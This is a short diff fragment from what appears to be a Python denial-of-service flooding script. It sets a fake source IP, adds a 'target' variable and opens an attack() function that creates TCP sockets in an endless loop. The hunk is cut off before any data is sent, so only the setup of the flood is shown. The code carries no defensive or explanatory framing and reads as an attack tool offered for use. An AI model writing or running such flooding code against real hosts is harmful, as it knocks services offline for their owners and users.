@@ -90,7 +90,7 @@ print("\033[94m")
 #########################################################################
 
 fake_ip = '77.109.33.232'
-
+target = ip
 def attack():
     while True:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
